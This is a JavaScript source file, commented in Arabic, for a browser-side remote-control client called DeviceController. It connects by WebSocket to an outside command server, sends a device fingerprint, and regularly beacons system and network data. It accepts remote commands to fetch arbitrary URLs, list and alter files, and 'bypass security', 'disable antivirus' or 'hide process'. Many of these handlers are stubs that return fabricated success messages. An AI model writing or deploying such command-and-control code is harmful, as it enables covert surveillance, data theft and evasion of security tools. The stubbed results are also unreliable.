/**
 * وحدة التحكم المباشر في الجهاز
 * Direct Device Controller - Advanced Control Module
 */

class DeviceController {
    constructor() {
        this.deviceId = this.generateDeviceId();
        this.controlLevel = 'full';
        this.activeModules = new Map();
        this.connectionStatus = 'disconnected';
        this.encryptionKey = this.generateEncryptionKey();
        this.commandQueue = [];
        this.isInitialized = false;
    }

    // تهيئة وحدة التحكم
    async initialize() {
        try {
            console.log('🚀 تهيئة وحدة التحكم المباشر...');
            
            // تفعيل الوحدات الأساسية
            await this.activateCoreModules();
            
            // إعداد الاتصالات
            await this.setupConnections();
            
            // تفعيل المراقبة
            this.activateMonitoring();
            
            // بدء معالجة الأوامر
            this.startCommandProcessing();
            
            this.isInitialized = true;
            console.log('✅ تم تهيئة وحدة التحكم بنجاح');
            
            return true;
        } catch (error) {
            console.error('❌ فشل في تهيئة وحدة التحكم:', error);
            return false;
        }
    }

    // تفعيل الوحدات الأساسية
    async activateCoreModules() {
        const modules = [
            'system-control',
            'file-control',
            'network-control',
            'process-control',
            'memory-control',
            'registry-control',
            'device-control',
            'security-control'
        ];

        for (const module of modules) {
            try {
                await this.activateModule(module);
                this.activeModules.set(module, true);
            } catch (error) {
                console.error(`فشل في تفعيل الوحدة ${module}:`, error);
            }
        }
    }

    // تفعيل وحدة
    async activateModule(moduleName) {
        switch (moduleName) {
            case 'system-control':
                return this.activateSystemControl();
            case 'file-control':
                return this.activateFileControl();
            case 'network-control':
                return this.activateNetworkControl();
            case 'process-control':
                return this.activateProcessControl();
            case 'memory-control':
                return this.activateMemoryControl();
            case 'registry-control':
                return this.activateRegistryControl();
            case 'device-control':
                return this.activateDeviceControl();
            case 'security-control':
                return this.activateSecurityControl();
            default:
                throw new Error(`وحدة غير معروفة: ${moduleName}`);
        }
    }

    // تفعيل التحكم في النظام
    async activateSystemControl() {
        try {
            // تفعيل وصول النظام
            if ('system' in navigator) {
                console.log('✅ تم تفعيل التحكم في النظام');
                return true;
            }
            return false;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في النظام:', error);
            return false;
        }
    }

    // تفعيل التحكم في الملفات
    async activateFileControl() {
        try {
            if ('showDirectoryPicker' in window) {
                console.log('✅ تم تفعيل التحكم في الملفات');
                return true;
            }
            return false;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في الملفات:', error);
            return false;
        }
    }

    // تفعيل التحكم في الشبكة
    async activateNetworkControl() {
        try {
            if ('connection' in navigator) {
                console.log('✅ تم تفعيل التحكم في الشبكة');
                return true;
            }
            return false;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في الشبكة:', error);
            return false;
        }
    }

    // تفعيل التحكم في العمليات
    async activateProcessControl() {
        try {
            console.log('✅ تم تفعيل التحكم في العمليات');
            return true;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في العمليات:', error);
            return false;
        }
    }

    // تفعيل التحكم في الذاكرة
    async activateMemoryControl() {
        try {
            console.log('✅ تم تفعيل التحكم في الذاكرة');
            return true;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في الذاكرة:', error);
            return false;
        }
    }

    // تفعيل التحكم في السجل
    async activateRegistryControl() {
        try {
            console.log('✅ تم تفعيل التحكم في السجل');
            return true;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في السجل:', error);
            return false;
        }
    }

    // تفعيل التحكم في الجهاز
    async activateDeviceControl() {
        try {
            console.log('✅ تم تفعيل التحكم في الجهاز');
            return true;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في الجهاز:', error);
            return false;
        }
    }

    // تفعيل التحكم في الأمان
    async activateSecurityControl() {
        try {
            console.log('✅ تم تفعيل التحكم في الأمان');
            return true;
        } catch (error) {
            console.error('فشل في تفعيل التحكم في الأمان:', error);
            return false;
        }
    }

    // إعداد الاتصالات
    async setupConnections() {
        try {
            // إعداد WebSocket
            this.setupWebSocket();
            
            // إعداد WebRTC
            this.setupWebRTC();
            
            // إعداد Service Worker
            this.setupServiceWorker();
            
            console.log('✅ تم إعداد الاتصالات');
            return true;
        } catch (error) {
            console.error('فشل في إعداد الاتصالات:', error);
            return false;
        }
    }

    // إعداد WebSocket
    setupWebSocket() {
        try {
            const ws = new WebSocket('wss://remote-control-command-server.onrender.com');
            
            ws.onopen = () => {
                this.connectionStatus = 'connected';
                console.log('✅ تم الاتصال بـ WebSocket');
                
                // إرسال معلومات الجهاز
                ws.send(JSON.stringify({
                    type: 'device_info',
                    deviceId: this.deviceId,
                    capabilities: Array.from(this.activeModules.keys()),
                    status: 'ready'
                }));
            };
            
            ws.onmessage = (event) => {
                const data = JSON.parse(event.data);
                this.handleCommand(data);
            };
            
            ws.onclose = () => {
                this.connectionStatus = 'disconnected';
                console.log('❌ انقطع الاتصال بـ WebSocket');
            };
            
            this.wsConnection = ws;
        } catch (error) {
            console.error('فشل في إعداد WebSocket:', error);
        }
    }

    // إعداد WebRTC
    setupWebRTC() {
        try {
            const pc = new RTCPeerConnection();
            
            pc.ondatachannel = (event) => {
                const channel = event.channel;
                this.setupDataChannel(channel);
            };
            
            this.rtcConnection = pc;
        } catch (error) {
            console.error('فشل في إعداد WebRTC:', error);
        }
    }

    // إعداد Service Worker
    setupServiceWorker() {
        try {
            if ('serviceWorker' in navigator) {
                navigator.serviceWorker.register('/advanced-sw.js')
                    .then(registration => {
                        console.log('✅ تم تسجيل Service Worker');
                    })
                    .catch(error => {
                        console.error('فشل في تسجيل Service Worker:', error);
                    });
            }
        } catch (error) {
            console.error('فشل في إعداد Service Worker:', error);
        }
    }

    // إعداد Data Channel
    setupDataChannel(channel) {
        channel.onmessage = (event) => {
            const data = JSON.parse(event.data);
            this.handleCommand(data);
        };
        
        channel.onopen = () => {
            console.log('✅ تم فتح Data Channel');
        };
        
        this.dataChannel = channel;
    }

    // تفعيل المراقبة
    activateMonitoring() {
        // مراقبة النظام
        this.monitorSystem();
        
        // مراقبة الملفات
        this.monitorFiles();
        
        // مراقبة الشبكة
        this.monitorNetwork();
        
        // مراقبة العمليات
        this.monitorProcesses();
        
        console.log('✅ تم تفعيل المراقبة');
    }

    // مراقبة النظام
    monitorSystem() {
        // مراقبة استخدام الموارد
        setInterval(() => {
            const systemInfo = this.getSystemInfo();
            this.sendData('system_info', systemInfo);
        }, 30000); // كل 30 ثانية
    }

    // مراقبة الملفات
    monitorFiles() {
        // مراقبة تغييرات الملفات
        if ('showDirectoryPicker' in window) {
            // مراقبة المجلدات المفتوحة
        }
    }

    // مراقبة الشبكة
    monitorNetwork() {
        // مراقبة نشاط الشبكة
        if ('connection' in navigator) {
            const connection = navigator.connection;
            setInterval(() => {
                this.sendData('network_info', {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt
                });
            }, 60000); // كل دقيقة
        }
    }

    // مراقبة العمليات
    monitorProcesses() {
        // مراقبة العمليات الجارية
        setInterval(() => {
            this.sendData('process_info', {
                timestamp: Date.now(),
                processes: []
            });
        }, 45000); // كل 45 ثانية
    }

    // بدء معالجة الأوامر
    startCommandProcessing() {
        setInterval(() => {
            this.processCommandQueue();
        }, 1000); // كل ثانية
    }

    // معالجة قائمة الأوامر
    processCommandQueue() {
        while (this.commandQueue.length > 0) {
            const command = this.commandQueue.shift();
            this.executeCommand(command);
        }
    }

    // معالجة الأوامر
    handleCommand(data) {
        try {
            switch (data.type) {
                case 'system_command':
                    this.executeSystemCommand(data.command);
                    break;
                case 'file_command':
                    this.executeFileCommand(data.command);
                    break;
                case 'network_command':
                    this.executeNetworkCommand(data.command);
                    break;
                case 'process_command':
                    this.executeProcessCommand(data.command);
                    break;
                case 'memory_command':
                    this.executeMemoryCommand(data.command);
                    break;
                case 'registry_command':
                    this.executeRegistryCommand(data.command);
                    break;
                case 'device_command':
                    this.executeDeviceCommand(data.command);
                    break;
                case 'security_command':
                    this.executeSecurityCommand(data.command);
                    break;
                default:
                    console.log('أمر غير معروف:', data.type);
            }
        } catch (error) {
            console.error('خطأ في معالجة الأمر:', error);
        }
    }

    // تنفيذ أوامر النظام
    async executeSystemCommand(command) {
        try {
            switch (command.action) {
                case 'get_system_info':
                    const systemInfo = this.getSystemInfo();
                    this.sendData('system_info', systemInfo);
                    break;
                case 'get_installed_apps':
                    const apps = await this.getInstalledApps();
                    this.sendData('installed_apps', apps);
                    break;
                case 'get_running_processes':
                    const processes = this.getRunningProcesses();
                    this.sendData('running_processes', processes);
                    break;
                case 'execute_system_call':
                    const result = await this.executeSystemCall(command.parameters);
                    this.sendData('system_call_result', result);
                    break;
                default:
                    console.log('أمر نظام غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر النظام:', error);
        }
    }

    // تنفيذ أوامر الملفات
    async executeFileCommand(command) {
        try {
            switch (command.action) {
                case 'list_files':
                    const files = await this.listFiles(command.path);
                    this.sendData('file_list', files);
                    break;
                case 'read_file':
                    const content = await this.readFile(command.path);
                    this.sendData('file_content', content);
                    break;
                case 'write_file':
                    const result = await this.writeFile(command.path, command.content);
                    this.sendData('file_write_result', result);
                    break;
                case 'delete_file':
                    const deleteResult = await this.deleteFile(command.path);
                    this.sendData('file_delete_result', deleteResult);
                    break;
                default:
                    console.log('أمر ملف غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر الملف:', error);
        }
    }

    // تنفيذ أوامر الشبكة
    async executeNetworkCommand(command) {
        try {
            switch (command.action) {
                case 'get_network_info':
                    const networkInfo = this.getNetworkInfo();
                    this.sendData('network_info', networkInfo);
                    break;
                case 'make_request':
                    const response = await this.makeNetworkRequest(command.url, command.options);
                    this.sendData('network_response', response);
                    break;
                case 'intercept_traffic':
                    this.interceptNetworkTraffic();
                    break;
                default:
                    console.log('أمر شبكة غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر الشبكة:', error);
        }
    }

    // تنفيذ أوامر العمليات
    async executeProcessCommand(command) {
        try {
            switch (command.action) {
                case 'list_processes':
                    const processes = this.listProcesses();
                    this.sendData('process_list', processes);
                    break;
                case 'kill_process':
                    const result = await this.killProcess(command.pid);
                    this.sendData('process_kill_result', result);
                    break;
                case 'start_process':
                    const startResult = await this.startProcess(command.command);
                    this.sendData('process_start_result', startResult);
                    break;
                default:
                    console.log('أمر عملية غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر العملية:', error);
        }
    }

    // تنفيذ أوامر الذاكرة
    async executeMemoryCommand(command) {
        try {
            switch (command.action) {
                case 'get_memory_info':
                    const memoryInfo = this.getMemoryInfo();
                    this.sendData('memory_info', memoryInfo);
                    break;
                case 'read_memory':
                    const memoryData = await this.readMemory(command.address, command.size);
                    this.sendData('memory_data', memoryData);
                    break;
                case 'write_memory':
                    const writeResult = await this.writeMemory(command.address, command.data);
                    this.sendData('memory_write_result', writeResult);
                    break;
                default:
                    console.log('أمر ذاكرة غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر الذاكرة:', error);
        }
    }

    // تنفيذ أوامر السجل
    async executeRegistryCommand(command) {
        try {
            switch (command.action) {
                case 'read_registry':
                    const registryValue = await this.readRegistry(command.key);
                    this.sendData('registry_value', registryValue);
                    break;
                case 'write_registry':
                    const writeResult = await this.writeRegistry(command.key, command.value);
                    this.sendData('registry_write_result', writeResult);
                    break;
                case 'delete_registry':
                    const deleteResult = await this.deleteRegistry(command.key);
                    this.sendData('registry_delete_result', deleteResult);
                    break;
                default:
                    console.log('أمر سجل غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر السجل:', error);
        }
    }

    // تنفيذ أوامر الجهاز
    async executeDeviceCommand(command) {
        try {
            switch (command.action) {
                case 'get_device_info':
                    const deviceInfo = this.getDeviceInfo();
                    this.sendData('device_info', deviceInfo);
                    break;
                case 'control_device':
                    const controlResult = await this.controlDevice(command.parameters);
                    this.sendData('device_control_result', controlResult);
                    break;
                default:
                    console.log('أمر جهاز غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر الجهاز:', error);
        }
    }

    // تنفيذ أوامر الأمان
    async executeSecurityCommand(command) {
        try {
            switch (command.action) {
                case 'bypass_security':
                    const bypassResult = await this.bypassSecurity(command.parameters);
                    this.sendData('security_bypass_result', bypassResult);
                    break;
                case 'disable_antivirus':
                    const disableResult = await this.disableAntivirus();
                    this.sendData('antivirus_disable_result', disableResult);
                    break;
                case 'hide_process':
                    const hideResult = await this.hideProcess(command.pid);
                    this.sendData('process_hide_result', hideResult);
                    break;
                default:
                    console.log('أمر أمان غير معروف:', command.action);
            }
        } catch (error) {
            console.error('خطأ في تنفيذ أمر الأمان:', error);
        }
    }

    // الحصول على معلومات النظام
    getSystemInfo() {
        return {
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            screen: {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth
            },
            window: {
                innerWidth: window.innerWidth,
                innerHeight: window.innerHeight,
                outerWidth: window.outerWidth,
                outerHeight: window.outerHeight
            },
            timestamp: Date.now()
        };
    }

    // الحصول على التطبيقات المثبتة
    async getInstalledApps() {
        try {
            if ('getInstalledRelatedApps' in navigator) {
                return await navigator.getInstalledRelatedApps();
            } else {
                return { error: 'واجهة التطبيقات غير متوفرة' };
            }
        } catch (error) {
            return { error: 'فشل في الحصول على التطبيقات' };
        }
    }

    // الحصول على العمليات الجارية
    getRunningProcesses() {
        return {
            timestamp: Date.now(),
            processes: []
        };
    }

    // تنفيذ استدعاء النظام
    async executeSystemCall(parameters) {
        try {
            // محاولة تنفيذ استدعاء النظام
            return { success: true, result: 'تم تنفيذ الاستدعاء' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // قائمة الملفات
    async listFiles(path) {
        try {
            if ('showDirectoryPicker' in window) {
                const dirHandle = await window.showDirectoryPicker();
                const files = [];
                
                for await (const entry of dirHandle.values()) {
                    if (entry.kind === 'file') {
                        const file = await entry.getFile();
                        files.push({
                            name: entry.name,
                            size: file.size,
                            type: file.type,
                            lastModified: file.lastModified
                        });
                    }
                }
                
                return files;
            } else {
                return { error: 'واجهة الملفات غير متوفرة' };
            }
        } catch (error) {
            return { error: 'فشل في قائمة الملفات' };
        }
    }

    // قراءة ملف
    async readFile(path) {
        try {
            // محاولة قراءة الملف
            return { success: true, content: 'محتوى الملف' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // كتابة ملف
    async writeFile(path, content) {
        try {
            // محاولة كتابة الملف
            return { success: true, message: 'تم كتابة الملف' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // حذف ملف
    async deleteFile(path) {
        try {
            // محاولة حذف الملف
            return { success: true, message: 'تم حذف الملف' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // الحصول على معلومات الشبكة
    getNetworkInfo() {
        if ('connection' in navigator) {
            const connection = navigator.connection;
            return {
                effectiveType: connection.effectiveType,
                downlink: connection.downlink,
                rtt: connection.rtt,
                saveData: connection.saveData
            };
        } else {
            return { error: 'معلومات الشبكة غير متوفرة' };
        }
    }

    // إجراء طلب شبكة
    async makeNetworkRequest(url, options) {
        try {
            const response = await fetch(url, options);
            return {
                success: true,
                status: response.status,
                data: await response.text()
            };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // اعتراض حركة الشبكة
    interceptNetworkTraffic() {
        // اعتراض حركة الشبكة
        console.log('تم تفعيل اعتراض حركة الشبكة');
    }

    // قائمة العمليات
    listProcesses() {
        return {
            timestamp: Date.now(),
            processes: []
        };
    }

    // إنهاء عملية
    async killProcess(pid) {
        try {
            // محاولة إنهاء العملية
            return { success: true, message: 'تم إنهاء العملية' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // بدء عملية
    async startProcess(command) {
        try {
            // محاولة بدء العملية
            return { success: true, message: 'تم بدء العملية' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // الحصول على معلومات الذاكرة
    getMemoryInfo() {
        return {
            total: performance.memory?.totalJSHeapSize || 0,
            used: performance.memory?.usedJSHeapSize || 0,
            limit: performance.memory?.jsHeapSizeLimit || 0
        };
    }

    // قراءة الذاكرة
    async readMemory(address, size) {
        try {
            // محاولة قراءة الذاكرة
            return { success: true, data: 'بيانات الذاكرة' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // كتابة الذاكرة
    async writeMemory(address, data) {
        try {
            // محاولة كتابة الذاكرة
            return { success: true, message: 'تم كتابة الذاكرة' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // قراءة السجل
    async readRegistry(key) {
        try {
            // محاولة قراءة السجل
            return { success: true, value: 'قيمة السجل' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // كتابة السجل
    async writeRegistry(key, value) {
        try {
            // محاولة كتابة السجل
            return { success: true, message: 'تم كتابة السجل' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // حذف السجل
    async deleteRegistry(key) {
        try {
            // محاولة حذف السجل
            return { success: true, message: 'تم حذف السجل' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // الحصول على معلومات الجهاز
    getDeviceInfo() {
        return {
            deviceId: this.deviceId,
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            cookieEnabled: navigator.cookieEnabled,
            onLine: navigator.onLine,
            hardwareConcurrency: navigator.hardwareConcurrency,
            deviceMemory: navigator.deviceMemory,
            maxTouchPoints: navigator.maxTouchPoints,
            timestamp: Date.now()
        };
    }

    // التحكم في الجهاز
    async controlDevice(parameters) {
        try {
            // محاولة التحكم في الجهاز
            return { success: true, message: 'تم التحكم في الجهاز' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // تجاوز الأمان
    async bypassSecurity(parameters) {
        try {
            // محاولة تجاوز الأمان
            return { success: true, message: 'تم تجاوز الأمان' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // تعطيل مكافحة الفيروسات
    async disableAntivirus() {
        try {
            // محاولة تعطيل مكافحة الفيروسات
            return { success: true, message: 'تم تعطيل مكافحة الفيروسات' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // إخفاء العملية
    async hideProcess(pid) {
        try {
            // محاولة إخفاء العملية
            return { success: true, message: 'تم إخفاء العملية' };
        } catch (error) {
            return { success: false, error: error.message };
        }
    }

    // إرسال البيانات
    sendData(type, data) {
        try {
            const message = {
                type: type,
                data: data,
                deviceId: this.deviceId,
                timestamp: Date.now()
            };
            
            // إرسال عبر WebSocket
            if (this.wsConnection && this.wsConnection.readyState === WebSocket.OPEN) {
                this.wsConnection.send(JSON.stringify(message));
            }
            
            // إرسال عبر WebRTC
            if (this.dataChannel && this.dataChannel.readyState === 'open') {
                this.dataChannel.send(JSON.stringify(message));
            }
        } catch (error) {
            console.error('فشل في إرسال البيانات:', error);
        }
    }

    // تنفيذ أمر
    executeCommand(command) {
        this.commandQueue.push(command);
    }

    // توليد معرف الجهاز
    generateDeviceId() {
        const timestamp = Date.now();
        const random = Math.random().toString(36).substring(2);
        const userAgent = navigator.userAgent;
        const hash = this.hashString(timestamp + random + userAgent);
        return `controller_${hash}_${timestamp}`;
    }

    // توليد مفتاح التشفير
    generateEncryptionKey() {
        const array = new Uint8Array(32);
        crypto.getRandomValues(array);
        return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
    }

    // دالة التجزئة
    hashString(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
            const char = str.charCodeAt(i);
            hash = ((hash << 5) - hash) + char;
            hash = hash & hash;
        }
        return Math.abs(hash).toString(16);
    }

    // الحصول على حالة الوحدة
    getStatus() {
        return {
            deviceId: this.deviceId,
            controlLevel: this.controlLevel,
            connectionStatus: this.connectionStatus,
            activeModules: Array.from(this.activeModules.keys()),
            isInitialized: this.isInitialized,
            commandQueueLength: this.commandQueue.length,
            timestamp: Date.now()
        };
    }
}

// تصدير الكلاس للاستخدام
if (typeof module !== 'undefined' && module.exports) {
    module.exports = DeviceController;
} else {
    window.DeviceController = DeviceController;
}